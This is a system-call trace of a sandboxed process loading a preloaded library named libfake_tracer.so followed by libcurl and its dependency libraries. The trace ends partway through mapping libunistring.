22    14:56:49.359784 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
22    14:56:49.360556 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.361064 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
22    14:56:49.361631 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x74e6ed39a000
22    14:56:49.362026 mmap(0x74e6ed39b000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x74e6ed39b000
22    14:56:49.362401 mmap(0x74e6ed39c000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x74e6ed39c000
22    14:56:49.362841 mmap(0x74e6ed39d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x74e6ed39d000
22    14:56:49.363258 close(3</usr/lib/libfake_tracer.so>) = 0
22    14:56:49.363652 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
22    14:56:49.364017 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
22    14:56:49.364407 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
22    14:56:49.364777 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x74e6ed398000
22    14:56:49.365141 close(3</etc/ld.so.cache>) = 0
22    14:56:49.365501 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcurl.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>
22    14:56:49.365897 read(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.366263 fstat(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, {st_mode=S_IFREG|0644, st_size=786336, ...}) = 0
22    14:56:49.366659 mmap(NULL, 789456, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0) = 0x74e6ed2d7000
22    14:56:49.367023 mmap(0x74e6ed2e8000, 573440, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x11000) = 0x74e6ed2e8000
22    14:56:49.367401 mmap(0x74e6ed374000, 118784, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x9d000) = 0x74e6ed374000
22    14:56:49.367765 mmap(0x74e6ed391000, 28672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0xb9000) = 0x74e6ed391000
22    14:56:49.368141 close(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>) = 0
22    14:56:49.368491 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libz.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>
22    14:56:49.368889 read(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.369242 fstat(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, {st_mode=S_IFREG|0644, st_size=113000, ...}) = 0
22    14:56:49.369623 mmap(NULL, 110744, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0) = 0x74e6ed2bb000
22    14:56:49.370048 mmap(0x74e6ed2bd000, 73728, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x2000) = 0x74e6ed2bd000
22    14:56:49.370413 mmap(0x74e6ed2cf000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x14000) = 0x74e6ed2cf000
22    14:56:49.370790 mmap(0x74e6ed2d5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x1a000) = 0x74e6ed2d5000
22    14:56:49.371165 close(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>) = 0
22    14:56:49.371522 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
22    14:56:49.371926 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
22    14:56:49.372282 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
22    14:56:49.372634 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
22    14:56:49.372985 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
22    14:56:49.373331 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x74e6ed0a9000
22    14:56:49.373768 mmap(0x74e6ed0d1000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x74e6ed0d1000
22    14:56:49.374203 mmap(0x74e6ed259000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x74e6ed259000
22    14:56:49.374695 mmap(0x74e6ed2a8000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x74e6ed2a8000
22    14:56:49.375159 mmap(0x74e6ed2ae000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74e6ed2ae000
22    14:56:49.375574 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
22    14:56:49.375954 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnghttp2.so.14", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>
22    14:56:49.376365 read(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.376727 fstat(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, {st_mode=S_IFREG|0644, st_size=170352, ...}) = 0
22    14:56:49.377101 mmap(NULL, 172272, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0) = 0x74e6ed07e000
22    14:56:49.377452 mmap(0x74e6ed083000, 90112, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x5000) = 0x74e6ed083000
22    14:56:49.377813 mmap(0x74e6ed099000, 49152, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x1b000) = 0x74e6ed099000
22    14:56:49.378176 mmap(0x74e6ed0a5000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x26000) = 0x74e6ed0a5000
22    14:56:49.378558 close(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>) = 0
22    14:56:49.378947 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>
22    14:56:49.379343 read(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.379704 fstat(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, {st_mode=S_IFREG|0644, st_size=133192, ...}) = 0
22    14:56:49.380059 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ed07c000
22    14:56:49.380420 mmap(NULL, 135184, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0) = 0x74e6ed05a000
22    14:56:49.380797 mmap(0x74e6ed05c000, 16384, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x2000) = 0x74e6ed05c000
22    14:56:49.381174 mmap(0x74e6ed060000, 106496, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x6000) = 0x74e6ed060000
22    14:56:49.381528 mmap(0x74e6ed07a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x1f000) = 0x74e6ed07a000
22    14:56:49.381910 close(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>) = 0
22    14:56:49.382260 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/librtmp.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>
22    14:56:49.382741 read(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.383111 fstat(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, {st_mode=S_IFREG|0644, st_size=121848, ...}) = 0
22    14:56:49.383467 mmap(NULL, 119712, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0) = 0x74e6ed03c000
22    14:56:49.383822 mmap(0x74e6ed041000, 69632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x5000) = 0x74e6ed041000
22    14:56:49.384185 mmap(0x74e6ed052000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x16000) = 0x74e6ed052000
22    14:56:49.384542 mmap(0x74e6ed058000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x1c000) = 0x74e6ed058000
22    14:56:49.384932 close(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>) = 0
22    14:56:49.385282 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssh.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>
22    14:56:49.385671 read(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.386044 fstat(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, {st_mode=S_IFREG|0644, st_size=462360, ...}) = 0
22    14:56:49.386394 mmap(NULL, 464400, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0) = 0x74e6ecfca000
22    14:56:49.386856 mmap(0x74e6ecfd8000, 294912, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0xe000) = 0x74e6ecfd8000
22    14:56:49.387239 mmap(0x74e6ed020000, 98304, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x56000) = 0x74e6ed020000
22    14:56:49.387597 mmap(0x74e6ed038000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x6d000) = 0x74e6ed038000
22    14:56:49.388012 close(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>) = 0
22    14:56:49.388368 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpsl.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>
22    14:56:49.388754 read(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.389133 fstat(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, {st_mode=S_IFREG|0644, st_size=75768, ...}) = 0
22    14:56:49.389502 mmap(NULL, 77840, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0) = 0x74e6ecfb6000
22    14:56:49.389856 mmap(0x74e6ecfb8000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x2000) = 0x74e6ecfb8000
22    14:56:49.390327 mmap(0x74e6ecfba000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x4000) = 0x74e6ecfba000
22    14:56:49.391018 mmap(0x74e6ecfc8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x11000) = 0x74e6ecfc8000
22    14:56:49.391590 close(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>) = 0
22    14:56:49.391990 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssl.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssl.so.3>
22    14:56:49.392425 read(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.392852 fstat(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, {st_mode=S_IFREG|0644, st_size=696512, ...}) = 0
22    14:56:49.393250 mmap(NULL, 694384, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0) = 0x74e6ecf0c000
22    14:56:49.393622 mmap(0x74e6ecf2a000, 401408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x1e000) = 0x74e6ecf2a000
22    14:56:49.394047 mmap(0x74e6ecf8c000, 114688, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x80000) = 0x74e6ecf8c000
22    14:56:49.394420 mmap(0x74e6ecfa8000, 57344, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x9c000) = 0x74e6ecfa8000
22    14:56:49.394877 close(3</usr/lib/x86_64-linux-gnu/libssl.so.3>) = 0
22    14:56:49.395242 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>
22    14:56:49.395649 read(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.396002 fstat(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, {st_mode=S_IFREG|0644, st_size=5309400, ...}) = 0
22    14:56:49.396354 mmap(NULL, 5323728, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0) = 0x74e6ec9f8000
22    14:56:49.396737 mmap(0x74e6ecaab000, 3358720, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0xb3000) = 0x74e6ecaab000
22    14:56:49.397129 mmap(0x74e6ecddf000, 831488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x3e7000) = 0x74e6ecddf000
22    14:56:49.397516 mmap(0x74e6eceaa000, 389120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x4b1000) = 0x74e6eceaa000
22    14:56:49.397894 mmap(0x74e6ecf09000, 11216, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74e6ecf09000
22    14:56:49.398262 close(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>) = 0
22    14:56:49.398673 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgssapi_krb5.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>
22    14:56:49.399066 read(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.399421 fstat(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, {st_mode=S_IFREG|0644, st_size=338696, ...}) = 0
22    14:56:49.399769 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ec9f6000
22    14:56:49.400112 mmap(NULL, 341080, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0) = 0x74e6ec9a2000
22    14:56:49.400461 mmap(0x74e6ec9ae000, 237568, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0xc000) = 0x74e6ec9ae000
22    14:56:49.400837 mmap(0x74e6ec9e8000, 40960, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x46000) = 0x74e6ec9e8000
22    14:56:49.401196 mmap(0x74e6ec9f2000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x4f000) = 0x74e6ec9f2000
22    14:56:49.401571 close(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>) = 0
22    14:56:49.401918 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libldap.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>
22    14:56:49.402303 read(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.402688 fstat(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=372400, ...}) = 0
22    14:56:49.403048 mmap(NULL, 383832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0) = 0x74e6ec944000
22    14:56:49.403398 mmap(0x74e6ec952000, 245760, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0xe000) = 0x74e6ec952000
22    14:56:49.403751 mmap(0x74e6ec98e000, 61440, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x4a000) = 0x74e6ec98e000
22    14:56:49.404113 mmap(0x74e6ec99d000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x58000) = 0x74e6ec99d000
22    14:56:49.404483 mmap(0x74e6ec9a0000, 7000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74e6ec9a0000
22    14:56:49.404846 close(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>) = 0
22    14:56:49.405193 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/liblber.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>
22    14:56:49.405595 read(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.405982 fstat(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=59888, ...}) = 0
22    14:56:49.406338 mmap(NULL, 61864, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0) = 0x74e6ec934000
22    14:56:49.406716 mmap(0x74e6ec937000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0x3000) = 0x74e6ec937000
22    14:56:49.407316 mmap(0x74e6ec93f000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xb000) = 0x74e6ec93f000
22    14:56:49.407815 mmap(0x74e6ec942000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xd000) = 0x74e6ec942000
22    14:56:49.408292 close(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>) = 0
22    14:56:49.408797 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libzstd.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>
22    14:56:49.409203 read(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.409541 fstat(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, {st_mode=S_IFREG|0644, st_size=755864, ...}) = 0
22    14:56:49.409900 mmap(NULL, 757816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0) = 0x74e6ec87a000
22    14:56:49.410239 mmap(0x74e6ec87e000, 684032, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0x4000) = 0x74e6ec87e000
22    14:56:49.410628 mmap(0x74e6ec925000, 53248, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xab000) = 0x74e6ec925000
22    14:56:49.410996 mmap(0x74e6ec932000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xb7000) = 0x74e6ec932000
22    14:56:49.411352 close(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>) = 0
22    14:56:49.411689 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlidec.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>
22    14:56:49.412058 read(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.412394 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=51512, ...}) = 0
22    14:56:49.412729 mmap(NULL, 53352, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0) = 0x74e6ec86c000
22    14:56:49.413062 mmap(0x74e6ec86d000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x1000) = 0x74e6ec86d000
22    14:56:49.413407 mmap(0x74e6ec875000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x9000) = 0x74e6ec875000
22    14:56:49.413759 mmap(0x74e6ec878000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0xb000) = 0x74e6ec878000
22    14:56:49.414153 close(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>) = 0
22    14:56:49.414508 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libunistring.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>
22    14:56:49.414923 read(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.415261 fstat(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, {st_mode=S_IFREG|0644, st_size=1755312, ...}) = 0
22    14:56:49.415598 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ec86a000
22    14:56:49.415933 mmap(NULL, 1755368, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0) = 0x74e6ec6bd000
22    14:56:49.416269 mmap(0x74e6ec6ce000, 225280, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x11000) = 0x74e6ec6ce000
